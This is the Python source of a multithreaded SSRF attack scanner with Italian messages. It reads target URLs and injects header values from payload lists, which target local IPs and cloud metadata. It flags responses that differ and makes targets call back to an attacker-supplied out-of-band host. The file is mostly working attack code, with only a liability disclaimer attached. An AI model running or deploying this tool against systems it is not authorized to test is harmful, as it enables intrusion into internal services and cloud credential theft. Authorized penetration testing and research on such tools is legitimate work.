import sys, getopt, os
import queue
from threading import Thread
from requests import Request, Session
from requests import ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError, TooManyRedirects
import urllib3
import warnings
import json
import re
import csv
from datetime import datetime
from urllib.parse import urlparse
import logging
import colorama
from colorama import Fore, Style



#TODO: Add Get/Post parameter

q = queue.Queue()
logger = logging.getLogger('ssrflogger')

backurl = ""
parameters = []
cloudParameters = []
headers = []
protocols = []
outputFilename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
completeFileName = "output/"+outputFilename+".txt"
completeFileNameCSV = "output/"+outputFilename+".csv"
os.makedirs(os.path.dirname(completeFileName), exist_ok=True)

#Initialize colorama
colorama.init(autoreset=True)

def printBanner():
    print("""

            ░██████╗░██████╗██████╗░███████╗
            ██╔════╝██╔════╝██╔══██╗██╔════╝
            ╚█████╗░╚█████╗░██████╔╝█████╗░░
            ░╚═══██╗░╚═══██╗██╔══██╗██╔══╝░░
            ██████╔╝██████╔╝██║░░██║██║░░░░░
            ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
    """)
    print("v1.0 - Dancas")
    print("[WRN] Use with caution. You are responsible for your actions")
    print("[WRN] Developers assume no liability and are not responsible for any misuse or damage.")


def printHelp():
    print(Fore.GREEN + "Displaying Help Menu")
    print(Fore.GREEN + "Welcome in SSRF tools developed by Daniele Castronovo")
    print(Fore.GREEN + "Use -h or --help to print this message")
    print(Fore.GREEN + "Use -u or --url to insert a single Url to analyze")
    print(Fore.GREEN + "Use -f or --file to insert a list of Url to analyze")
    print(Fore.GREEN + "Use -b or --backurl to insert the back connection that will be launched if attack goes well")
    print(Fore.GREEN + "Example: python3 ssrf.py -u https://google.com -b test1.free.beeceptor.com")
    print(Fore.GREEN + "Example: python3 ssrf.py -f urls.txt -b test1.free.beeceptor.com")


def checkInputParameter():
    parameters = {}
    # Remove 1st argument from the
    # list of command line arguments
    argumentList = sys.argv[1:]
    
    if(len(argumentList)==0):
        printHelp()
        exit()

    # Options
    options = "h:u:b:f:"
    # Long options
    long_options = ["help", "url", "backurl", "file"]
     
    try:
        # Parsing argument
        arguments, values = getopt.getopt(argumentList, options, long_options)

        
        # checking each argument
        for currentArgument, currentValue in arguments:
            if currentArgument in ("-h", "--help"):
                printHelp()

            elif currentArgument in ("-u", "--url"):
                parameters['url'] = currentValue

            elif currentArgument in ("-b", "--backurl"):
                global backurl 
                backurl = currentValue

            elif currentArgument in ("-f", "--file"):
                parameters['filename'] = currentValue

    except getopt.error as err:
        # output error, and return with an error code
        print(Fore.RED + str(err))
        exit()

    if('url' not in parameters.keys() and 'filename' not in parameters.keys()):
        print(Fore.RED + "Errore: Devi impostare almeno un url o un file")
        exit()


    return parameters

def loadFiles():
    global headers
    global parameters
    global protocols
    global cloudParameters
    with open('utils/headers.txt') as file:
        while line := file.readline():
            header = line.rstrip()
            headers.append(header)

    with open('utils/localIPAttack.txt') as file:
        while line := file.readline():
            parameter = line.rstrip()
            parameters.append(parameter)

    with open('utils/protocols.txt') as file:
        while line := file.readline():
            protocol = line.rstrip()
            protocols.append(protocol)

    with open('utils/cloud.txt') as file:
        while line := file.readline():
            cloudParameter = line.rstrip()
            cloudParameters.append(cloudParameter)


def headersScan(url, method, badHeaders="", originalUrl=""):
    # Creating a PoolManager instance for sending requests.
    http = urllib3.PoolManager()
    timeout = 1.0
    retries = False
    if(originalUrl==""):
        originalUrl = getHostnameFromUrl(url)
    else:
        originalUrl = getHostnameFromUrl(originalUrl)

    headers = {}
    goodHeaders = {
                'Accept-Encoding' : 'gzip, deflate',
                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Connection': 'keep-alive',
                'Host': originalUrl
              }

    if(badHeaders!=""):
        headers=goodHeaders|badHeaders
    else:
        headers=goodHeaders

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        resp = http.request(method, url, headers=headers, timeout=timeout, retries=retries)
        return resp
    except Exception as e:
        logger.error('Eccezzione: '+ str(e))
        #print(Fore.RED + "Eccezzione di coneessione con l'url: ", url)
    return None

def localAttack(url, originalResponse):
    #print("------LOCAL ATTACK------")

    for header in headers:
        for parameter in parameters:
            badHeader = {header:parameter}
            response = headersScan(url,'GET', badHeaders=badHeader)
            logInfo={
                    'Hostname':url, 
                    'HeaderField':header, 
                    'HeaderValue':parameter, 
                    'ResponseCode':'Error',
                    'ResponseSize':'Error'
            }
            if(response!=None):
                if(checkDifferenceinResponse(originalResponse, response)):
                    logInfo['ResponseCode']=str(response.status)
                    logInfo['ResponseSize']=str(sys.getsizeof(response.data))
                    logResult(logInfo, 2)


def remoteAttack(url):
    #logResult("------REMOTE ATTACK------",2)
    #print("------REMOTE ATTACK------")
    for header in headers:
        badHeader = {header:backurl}
        headersScan(url,'GET', badHeaders=badHeader)
    #verifyRemoteAttack()

def performAllAttack(url):
    originalResponse = headersScan(url,'GET')
    
    if(originalResponse != None):
        print("-----------------")
        print("Sto analizzando l'url", url," con staus code iniziale: ", originalResponse.status, " e dimensione: ", sys.getsizeof(originalResponse.data))
        logInfo={
            'Hostname':url, 
            'HeaderField':'N/A', 
            'HeaderValue':'N/A', 
            'ResponseCode':originalResponse.status,
            'ResponseSize':sys.getsizeof(originalResponse.data)
        }
        writeToCSV(logInfo)
        global backurl 
        if(backurl!=""):
            remoteAttack(url)
        #protocolAttack(url, originalResponse) #TODO: Da Valutare
        localAttack(url, originalResponse)
    else:
        print(Fore.RED + "Errore di connessione con l\'url:",url)

def checkDifferenceinResponse(response1, response2):
    status1 = response1.status
    response_size1 = sys.getsizeof(response1.data)
    status2 = response2.status
    response_size2 = sys.getsizeof(response2.data)
    if(status1!=status2 or response_size1!=response_size2):
        return True
    return False

def getHostnameFromUrl(url):
    return urlparse(url).netloc


def writeToCSV(row):
    # field names 
    fields = ['Hostname', 'HeaderField', 'HeaderValue', 'ResponseCode','ResponseSize']
        
    # writing to csv file 
    with open(completeFileNameCSV, 'a') as csvfile: 
        # creating a csv writer object 
        csvwriter = csv.DictWriter(csvfile,fieldnames = fields) 

        if csvfile.tell() == 0:
            # writing the fields 
            csvwriter.writeheader() 
            
        # writing the data rows 
        csvwriter.writerow(row)

def logResult(info, level=1):
    writeToCSV(info)


def scanFile(filename):
    with open(filename) as file:
        while line := file.readline():
            url = line.rstrip()
            q.put(url)
            #scanUrl(url)

    num_threads = 15
    for i in range(num_threads):
        worker = Thread(target=scanUrls, args=(q,))
        worker.start()

    q.join()

def scanUrl(url):
    performAllAttack(url)

def scanUrls(q):
    #url = q.get()
    #performAllAttack(url)
    #q.task_done()

    while True:
        url = q.get()
        if url is None:
            break
        try:
            performAllAttack(url)
            q.task_done()
        except Exception as e:
            print(e)
            q.task_done()
            continue


def main():
    printBanner()
    parameters = checkInputParameter()
    url = parameters.get('url')
    filename = parameters.get('filename')
    loadFiles()
    #backurl = getBackUrlFromPingb()
    if(url):
        scanUrl(url)
    elif(filename):
        scanFile(filename)
    
    

main()



'''
#TODO: Da perfezionare
def protocolAttack(url, originalResponse):
    print("------PROTOCOLS ATTACK------")

    for protocol in protocols:
        newUrl = url+protocol+backurl+'/'
        response = headersScan(newUrl,'GET',originalUrl=url)
        logInfo={
            'Hostname':url, 
            'HeaderField':'N/A', 
            'HeaderValue':protocol, 
            'ResponseCode':'Error',
            'ResponseSize':'Error'
        }
    if(response!=None):
        if(checkDifferenceinResponse(originalResponse, response)):
            testo = "Risposta differente con il parametro: ", protocol, " staus code: ",response.status, "e dimensione: ", sys.getsizeof(response.data)
            logInfo['ResponseCode']=response.status
            logInfo['ResponseSize']=sys.getsizeof(response.data)
            logResult(logInfo, 2)
    else:
        print(Fore.RED + "Errore di connessione con il parametro: ", protocol)


'''